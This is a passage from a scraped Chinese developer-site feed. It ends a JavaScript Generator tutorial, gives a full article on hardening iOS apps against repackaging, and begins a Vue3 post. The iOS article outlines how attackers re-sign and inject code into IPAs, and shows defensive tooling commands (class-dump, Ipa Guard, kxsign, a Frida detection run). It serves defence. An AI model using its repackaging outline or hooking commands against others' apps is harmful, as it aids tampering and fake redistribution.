<span class="hljs-title function_">runGenerator</span>(asyncGenerator);
</code></pre>
<h4 data-id="heading-10">说明：</h4>
<ul>
<li>
<p>上述代码中，<code>yield</code> 后面跟的是 Promise 对象，通过 <code>runGenerator</code> 函数自动处理 Promise 结果，实现异步流程的同步化写法；</p>
</li>
<li>
<p>后来的 <code>async/await</code> 本质上是 Generator + Promise 的语法糖，<code>async</code> 对应 Generator 函数，<code>await</code> 对应 <code>yield</code>，底层逻辑高度相似。</p>
</li>
</ul>
<h3 data-id="heading-11">2. 构建复杂迭代器——自定义遍历逻辑</h3>
<p>Generator 天生是迭代器生成器，无需手动实现 <code>next()</code> 方法，即可轻松构建复杂的遍历逻辑（如无限序列、条件遍历、嵌套结构扁平化等）。</p>
<h4 data-id="heading-12">示例 1：生成无限序列（斐波那契数列）</h4>
<pre><code class="hljs language-ini" lang="ini">// 生成无限斐波那契数列的 Generator
function* fibonacciGenerator() {
  let <span class="hljs-attr">a</span> = <span class="hljs-number">0</span>, b = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  while (true) {
    yield a<span class="hljs-comment">;</span>
    <span class="hljs-section">[a, b]</span> = <span class="hljs-section">[b, a + b]</span><span class="hljs-comment">; // 解构赋值更新状态</span>
  }
}
​
const <span class="hljs-attr">fibGenerator</span> = fibonacciGenerator()<span class="hljs-comment">;</span>
// 按需获取前 10 个斐波那契数
for (let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 10; i++) {</span>
  console.log(fibGenerator.next().value)<span class="hljs-comment">; // 0, 1, 1, 2, 3, 5, 8, 13, 21, 34</span>
}
</code></pre>
<h4 data-id="heading-13">示例 2：扁平化嵌套数组</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 扁平化嵌套数组的 Generator</span>
<span class="hljs-keyword">function</span>* <span class="hljs-title function_">flattenArray</span>(<span class="hljs-params">arr</span>) {
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> item <span class="hljs-keyword">of</span> arr) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(item)) {
      <span class="hljs-keyword">yield</span>* <span class="hljs-title function_">flattenArray</span>(item); <span class="hljs-comment">// yield*  delegating 到子 Generator，递归扁平化</span>
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">yield</span> item;
    }
  }
}
​
<span class="hljs-keyword">const</span> nestedArray = [<span class="hljs-number">1</span>, [<span class="hljs-number">2</span>, [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>], <span class="hljs-number">5</span>], <span class="hljs-number">6</span>];
<span class="hljs-keyword">const</span> flatGenerator = <span class="hljs-title function_">flattenArray</span>(nestedArray);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([...flatGenerator]); <span class="hljs-comment">// [1, 2, 3, 4, 5, 6]（通过扩展运算符遍历所有 yield 值）</span>
</code></pre>
<h3 data-id="heading-14">3. 状态机——管理复杂状态流转</h3>
<p>Generator 函数的暂停特性使其天然适合作为状态机，每个 <code>yield</code> 对应一个状态，<code>next()</code> 调用触发状态切换，无需额外维护状态变量。</p>
<h4 data-id="heading-15">示例：实现红绿灯状态机</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 红绿灯状态机 Generator</span>
<span class="hljs-keyword">function</span>* <span class="hljs-title function_">trafficLightGenerator</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
    <span class="hljs-keyword">yield</span> <span class="hljs-string">"红灯"</span>; <span class="hljs-comment">// 状态 1：红灯</span>
    <span class="hljs-keyword">yield</span> <span class="hljs-string">"绿灯"</span>; <span class="hljs-comment">// 状态 2：绿灯</span>
    <span class="hljs-keyword">yield</span> <span class="hljs-string">"黄灯"</span>; <span class="hljs-comment">// 状态 3：黄灯</span>
  }
}
​
<span class="hljs-keyword">const</span> lightGenerator = <span class="hljs-title function_">trafficLightGenerator</span>();
<span class="hljs-comment">// 模拟红绿灯切换（每 2 秒切换一次）</span>
<span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> { value } = lightGenerator.<span class="hljs-title function_">next</span>();
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"当前灯色："</span>, value); <span class="hljs-comment">// 红灯 → 绿灯 → 黄灯 → 红灯...循环</span>
}, <span class="hljs-number">2000</span>);
</code></pre>
<h3 data-id="heading-16">4. 惰性求值——按需计算，优化性能</h3>
<p>惰性求值（Lazy Evaluation）是指“只有在需要时才计算值”，Generator 的暂停特性使其成为实现惰性求值的理想工具，可减少不必要的计算和内存占用。</p>
<h4 data-id="heading-17">示例：生成海量数据的惰性遍历</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 生成 100 万条数据的 Generator（惰性生成，不占用大量内存）</span>
<span class="hljs-keyword">function</span>* <span class="hljs-title function_">largeDataGenerator</span>(<span class="hljs-params">count</span>) {
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt;= count; i++) {
    <span class="hljs-keyword">yield</span> { <span class="hljs-attr">id</span>: i, <span class="hljs-attr">value</span>: <span class="hljs-string">`数据 <span class="hljs-subst">${i}</span>`</span> }; <span class="hljs-comment">// 仅在调用 next() 时生成当前数据</span>
  }
}
​
<span class="hljs-keyword">const</span> dataGenerator = <span class="hljs-title function_">largeDataGenerator</span>(<span class="hljs-number">1000000</span>);
<span class="hljs-comment">// 按需获取数据，无需一次性加载 100 万条</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dataGenerator.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// 仅生成前 10 条数据</span>
}
</code></pre>
<h3 data-id="heading-18">5. 流程控制——分步执行复杂逻辑</h3>
<p>对于需要分步执行的复杂业务逻辑（如表单多步骤提交、向导式流程），Generator 可通过 <code>yield</code> 拆分步骤，实现逻辑解耦和灵活控制。</p>
<h4 data-id="heading-19">示例：多步骤表单提交</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 多步骤表单流程 Generator</span>
<span class="hljs-keyword">function</span>* <span class="hljs-title function_">formStepGenerator</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> step1Data = <span class="hljs-keyword">yield</span> <span class="hljs-string">"请填写基本信息（姓名、电话）"</span>;
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"基本信息提交："</span>, step1Data);
  
  <span class="hljs-keyword">const</span> step2Data = <span class="hljs-keyword">yield</span> <span class="hljs-string">"请填写地址信息（省、市、区）"</span>;
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"地址信息提交："</span>, step2Data);
  
  <span class="hljs-keyword">const</span> step3Data = <span class="hljs-keyword">yield</span> <span class="hljs-string">"请确认提交信息"</span>;
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"最终提交："</span>, step3Data);
  <span class="hljs-keyword">return</span> <span class="hljs-string">"表单提交成功"</span>;
}
​
<span class="hljs-comment">// 驱动表单流程</span>
<span class="hljs-keyword">const</span> formGenerator = <span class="hljs-title function_">formStepGenerator</span>();
<span class="hljs-comment">// 模拟用户分步输入</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(formGenerator.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// 步骤 1：提示填写基本信息</span>
formGenerator.<span class="hljs-title function_">next</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">"张三"</span>, <span class="hljs-attr">phone</span>: <span class="hljs-string">"13800138000"</span> }); <span class="hljs-comment">// 提交步骤 1 数据</span>
​
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(formGenerator.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// 步骤 2：提示填写地址信息</span>
formGenerator.<span class="hljs-title function_">next</span>({ <span class="hljs-attr">province</span>: <span class="hljs-string">"广东省"</span>, <span class="hljs-attr">city</span>: <span class="hljs-string">"深圳市"</span>, <span class="hljs-attr">area</span>: <span class="hljs-string">"南山区"</span> }); <span class="hljs-comment">// 提交步骤 2 数据</span>
​
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(formGenerator.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// 步骤 3：提示确认信息</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(formGenerator.<span class="hljs-title function_">next</span>(<span class="hljs-string">"确认提交"</span>).<span class="hljs-property">value</span>); <span class="hljs-comment">// 提交步骤 3 数据，返回最终结果</span>
</code></pre>
<h2 data-id="heading-20">四、Generator 与 async/await 的关系——替代与传承</h2>
<p>提到 Generator 的异步应用，就不得不提 <code>async/await</code>。<code>async/await</code> 是 ES2017 引入的特性，本质上是 Generator + Promise 的语法糖，它解决了 Generator 需手动驱动（如 <code>runGenerator</code> 函数）的痛点，让异步代码更简洁、更易理解。</p>
<h3 data-id="heading-21">对比：Generator 与 async/await 实现同一异步逻辑</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Generator 版本</span>
<span class="hljs-keyword">function</span>* <span class="hljs-title function_">asyncGenerator</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> data1 = <span class="hljs-keyword">yield</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-string">"https://api.example.com/data1"</span>);
  <span class="hljs-keyword">const</span> data2 = <span class="hljs-keyword">yield</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-string">"https://api.example.com/data2"</span>);
  <span class="hljs-keyword">return</span> [data1, data2];
}
​
<span class="hljs-comment">// async/await 版本（语法糖，更简洁）</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">asyncFunction</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> data1 = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-string">"https://api.example.com/data1"</span>);
  <span class="hljs-keyword">const</span> data2 = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-string">"https://api.example.com/data2"</span>);
  <span class="hljs-keyword">return</span> [data1, data2];
}
</code></pre>
<h3 data-id="heading-22">核心区别：</h3>
<ol>
<li>
<p><strong>自动驱动</strong>：<code>async/await</code> 无需手动编写驱动函数（如 <code>runGenerator</code>），JavaScript 引擎自动处理 Promise 与流程恢复；</p>
</li>
<li>
<p><strong>返回值</strong>：<code>async</code> 函数直接返回 Promise，而 Generator 函数返回迭代器对象；</p>
</li>
<li>
<p><strong>错误处理</strong>：<code>async/await</code> 可直接使用 <code>try/catch</code> 捕获错误，Generator 需在 <code>next()</code> 调用或 Promise 中处理错误；</p>
</li>
<li>
<p><strong>语义清晰</strong>：<code>async/await</code> 明确表示“异步操作”，语义更直观，降低学习成本。</p>
</li>
</ol>
<h3 data-id="heading-23">结论：</h3>
<ul>
<li>
<p>现代开发中，异步编程优先使用 <code>async/await</code>，它是 Generator 异步方案的优化版；</p>
</li>
<li>
<p>但 Generator 并非过时——在迭代器构建、状态机、惰性求值等场景中，Generator 仍有不可替代的优势。</p>
</li>
</ul>
<h2 data-id="heading-24">五、使用 Generator 的注意事项</h2>
<ol>
<li>
<p><strong>不可重复执行</strong>：Generator 函数返回的迭代器对象只能遍历一次，若需重新执行，需重新调用 Generator 函数生成新的迭代器；</p>
</li>
<li>
<p><strong><code>yield</code></strong> <strong>不能在普通函数中使用</strong>：<code>yield</code> 关键字只能在 Generator 函数（<code>function*</code>）内部使用，否则会报错；</p>
</li>
<li>
<p><strong><code>return</code></strong> <strong>语句的影响</strong>：<code>return</code> 语句会终止 Generator 执行，其返回值不会被 <code>for...of</code> 循环遍历，仅在 <code>next()</code> 返回 <code>done: true</code> 时获取；</p>
</li>
<li>
<p><strong>错误处理</strong>：可通过迭代器的 <code>throw()</code> 方法抛出错误，在 Generator 函数内部用 <code>try/catch</code> 捕获：</p>
<ol>
<li>
<p><code>function* errorHandlerGenerator() { try { yield 1; yield 2; } catch (err) { console.log("捕获错误：", err); } } const generator = errorHandlerGenerator(); generator.next(); // { value: 1, done: false } generator.throw(new Error("自定义错误")); // 捕获错误，后续执行终止 generator.next(); // { value: undefined, done: true }</code></p>
</li>
</ol>
</li>
</ol>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[防止 iOS 应用被二次打包，从完整性校验到 IPA 成品混淆的多层安全方案]]></title>    <link>https://juejin.cn/post/7575884229525405732</link>    <guid>https://juejin.cn/post/7575884229525405732</guid>    <pubDate>2025-11-24T06:24:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575884229525405732" data-draft-id="7575884229525389348" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="防止 iOS 应用被二次打包，从完整性校验到 IPA 成品混淆的多层安全方案"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T06:24:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="iOS开发上架哦"/> <meta itemprop="url" content="https://juejin.cn/user/3336394949004844"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            防止 iOS 应用被二次打包，从完整性校验到 IPA 成品混淆的多层安全方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3336394949004844/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    iOS开发上架哦
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:24:22.000Z" title="Mon Nov 24 2025 06:24:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在移动安全领域，“二次打包”是 iOS 应用遭遇的最现实威胁之一。尽管 iOS 的安全体系比 Android 严格得多，但只要攻击者获取到 IPA，仍然可以：</p>
<ul>
<li>重新签名（企业证书 / 越狱环境）</li>
<li>篡改资源文件（JS、H5、json、图片、配置）</li>
<li>注入恶意代码（动态库添加）</li>
<li>调整网络请求、Hook 核心逻辑</li>
<li>将修改后的 App 伪装成原版进行分发</li>
</ul>
<p>因此，“防止 iOS 应用被二次打包”并不等于某个单点措施，而是需要一套覆盖 <strong>符号层、资源层、运行时层、签名层、完整性校验层、混淆层</strong> 的组合安全体系。</p>
<p>本文给出一套可在实际项目中落地的工程方案，适合原生、Flutter、H5、Hybrid 各类架构。</p>
<hr/>
<h2 data-id="heading-0">一、二次打包通常是怎么发生的？</h2>
<p>攻击者的常见操作步骤：</p>
<ol>
<li>解包原始 IPA</li>
<li>修改资源（图标、H5、JS 或敏感业务流程）</li>
<li>替换网络接口或注入业务逻辑</li>
<li>添加自定义动态库</li>
<li>重签名（不用 App Store 也能装进越狱机或企业分发）</li>
<li>伪装名称重新分发</li>
<li>用户误以为是官方版本进行下载</li>
</ol>
<p>你会发现：</p>
<ul>
<li>就算原生代码强，加密算法强</li>
<li>只要资源明文暴露，就能被篡改</li>
<li>只要 IPA 可以重签，就能被伪造</li>
<li>只要符号可读，就能轻易定位关键逻辑</li>
</ul>
<p>因此需要多层防护。</p>
<hr/>
<h2 data-id="heading-1">二、防止二次打包 = 多层组合，而非“一个加固工具”</h2>
<p>下面介绍的工具矩阵是完整解决方案的基础。</p>













































<table><thead><tr><th>防护层</th><th>使用工具</th><th>目的</th></tr></thead><tbody><tr><td>静态分析</td><td>MobSF / class-dump</td><td>找出可被轻易篡改的位置</td></tr><tr><td>成品混淆</td><td><strong>Ipa Guard CLI</strong></td><td>混淆符号、扰乱资源、修改 MD5</td></tr><tr><td>资源保护</td><td>Ipa Guard、脚本工具</td><td>防止图片/H5/JS 被替换</td></tr><tr><td>完整性校验</td><td>自研校验模块</td><td>检测注入、资源修改</td></tr><tr><td>重签验证</td><td>kxsign</td><td>检查二次打包是否改变结构</td></tr><tr><td>运行时对抗</td><td>Frida 检测、反调试策略</td><td>防止 Hook 和注入</td></tr><tr><td>上线后治理</td><td>KMS、Bugly/Sentry</td><td>绑定签名与构建号，保证可回滚</td></tr></tbody></table>
<p>以下是可直接应用的工程实践方案。</p>
<hr/>
<h2 data-id="heading-2">三、工程化流程：如何真正减少二次打包风险？</h2>
<h2 data-id="heading-3"><strong>① 使用 MobSF 与 class-dump 检查暴露面</strong></h2>
<p>检查：</p>
<ul>
<li>JS/H5 路径是否明文</li>
<li>JSON / 配置文件是否可替换</li>
<li>Swift/ObjC 方法是否过度暴露</li>
<li>插件桥接方法是否可被 Hook</li>
</ul>
<p>示例：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">class</span>-dump app.ipa &gt; symbols.txt
</code></pre>
<p>输出的数据将指导后续混淆白名单策略。</p>
<hr/>
<h2 data-id="heading-4"><strong>② 使用 Ipa Guard 导出可混淆符号</strong></h2>
<p>即使没有源码，也可以通过成品 IPA 分析和保护。</p>
<pre><code class="hljs language-bash" lang="bash">ipaguard_cli parse app.ipa -o sym.json
</code></pre>
<p>会得到一份包含：</p>
<ul>
<li>Swift/ObjC 类和方法列表</li>
<li>文件引用信息</li>
<li>字符串引用</li>
<li>是否可混淆字段</li>
</ul>
<p>这一步是混淆策略的基础。</p>
<hr/>
<h2 data-id="heading-5"><strong>③ 编辑混淆策略（最关键一步）</strong></h2>
<p>混淆策略要考虑：</p>
<h3 data-id="heading-6"><strong>哪些必须保留？</strong></h3>
<ul>
<li>Storyboard id</li>
<li>JS/H5 的桥接方法</li>
<li>SDK 初始化方法</li>
<li>依赖反射的 selector</li>
<li>Flutter 字符串通道名</li>
<li>React Native 桥接方法</li>
</ul>
<h3 data-id="heading-7"><strong>哪些可以混淆？</strong></h3>
<ul>
<li>内部业务逻辑</li>
<li>Swift 和 ObjC 的非外部方法</li>
<li>自定义组件</li>
<li>数据处理模块</li>
<li>容易被逆向定位的关键方法</li>
</ul>
<p>修改规则：</p>
<ul>
<li><code>confuse:false</code> 保留</li>
<li><code>confuse:true</code> 混淆</li>
<li><code>refactorName</code> 必须长度保持一致</li>
</ul>
<hr/>
<h2 data-id="heading-8"><strong>④ 执行 IPA 混淆与资源扰动（防篡改、防替换）</strong></h2>
<p>核心命令：</p>
<pre><code class="hljs language-bash" lang="bash">ipaguard_cli protect app.ipa -c sym.json --email dev@team.com --image --js -o protected.ipa
</code></pre>
<p>保护能力：</p>
<p>Swift/ObjC 方法名替换
类名重写
资源名称混淆
图片 MD5 扰动（使替换失效）
H5/JS 重命名（Hybrid 必须）
修改结构，干扰二次打包流程</p>
<p>混淆后的资源没有统一名称，攻击者难以判断哪些资源对应哪些逻辑。</p>
<hr/>
<h2 data-id="heading-9"><strong>⑤ 重签名并测试</strong></h2>
<p>测试混淆是否破坏功能。</p>
<pre><code class="hljs language-bash" lang="bash">kxsign sign protected.ipa -c dev.p12 -p <span class="hljs-built_in">pwd</span> \
  -m dev.mobileprovision -z signed.ipa -i
</code></pre>
<p>验证：</p>
<ul>
<li>启动与运行</li>
<li>登录逻辑</li>
<li>JS/H5 加载</li>
<li>Flutter/插件是否正常工作</li>
<li>推送、支付是否正常</li>
<li>配置文件读取是否正常</li>
</ul>
<hr/>
<h2 data-id="heading-10"><strong>⑥ 运行时对抗（进一步提高二次打包成本）</strong></h2>
<p>包含：</p>
<h3 data-id="heading-11"><strong>1. Frida 动态检测</strong></h3>
<pre><code class="hljs language-css" lang="css">frida -U -f com<span class="hljs-selector-class">.app</span> <span class="hljs-attr">--no-pause</span> -l detect<span class="hljs-selector-class">.js</span>
</code></pre>
<p>检查：</p>
<ul>
<li>是否能轻易 Hook</li>
<li>是否能注入自定义模块</li>
<li>私有 API 是否可被调用</li>
</ul>
<h3 data-id="heading-12"><strong>2. 基础反调试策略</strong></h3>
<p>（实现方式略，工程团队自有方案）</p>
<ul>
<li>ptrace</li>
<li>sysctl 检测调试器</li>
<li>检测越狱环境</li>
<li>检测动态库注入</li>
</ul>
<p>这些策略极大提升二次修改的难度。</p>
<hr/>
<h2 data-id="heading-13"><strong>⑦ 完整性校验体系（可选但强烈建议）</strong></h2>
<p>常见做法包括：</p>
<ul>
<li>校验资源文件 MD5</li>
<li>校验核心业务模块哈希</li>
<li>检测 main bundle 结构是否被修改</li>
<li>检测签名与构建号是否匹配</li>
</ul>
<p>配合 Ipa Guard 的 MD5 扰动效果更佳。</p>
<hr/>
<h2 data-id="heading-14"><strong>⑧ 混淆映射治理（保证正常运行与回滚能力）</strong></h2>
<p>存储内容：</p>
<ul>
<li>混淆映射表</li>
<li>sym.json</li>
<li>构建号</li>
<li>IPA 的签名指纹</li>
</ul>
<p>存放方式：</p>
<ul>
<li>KMS/HSM</li>
<li>加密 Git 仓库</li>
<li>部署流水线绑定</li>
</ul>
<p>用于：</p>
<ul>
<li>崩溃符号化</li>
<li>安全部署审计</li>
<li>一键回滚</li>
</ul>
<hr/>
<h2 data-id="heading-15">防止二次打包靠“组合拳”，而不是某个工具</h2>
<p>最终推荐方案：</p>
<h3 data-id="heading-16"><strong>分析层</strong></h3>
<p>MobSF
class-dump</p>
<h3 data-id="heading-17"><strong>加固层（核心）</strong></h3>
<p>Ipa Guard CLI</p>
<ul>
<li>IPA 符号混淆</li>
<li>资源名称扰动</li>
<li>H5/JS 路径保护</li>
<li>图片 MD5 干扰</li>
<li>无需源码即可使用</li>
</ul>
<h3 data-id="heading-18"><strong>验证层</strong></h3>
<p>kxsign（重签安装）
Frida（Hook/注入测试）
Hopper/IDA（查看混淆效果）</p>
<h3 data-id="heading-19"><strong>策略与治理层</strong></h3>
<p>完整性校验
KMS 映射治理
Bugly/Sentry 符号化</p>
<p><strong>只有当这些层协同工作时，二次打包的成本才会变得“不值得”。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3 组合式函数：能否作为模块级全局状态管理？]]></title>    <link>https://juejin.cn/post/7575718948299112499</link>    <guid>https://juejin.cn/post/7575718948299112499</guid>    <pubDate>2025-11-24T06:43:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575718948299112499" data-draft-id="7575757258834083866" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3 组合式函数：能否作为模块级全局状态管理？"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T06:43:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="三小河"/> <meta itemprop="url" content="https://juejin.cn/user/4222562141210478"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" 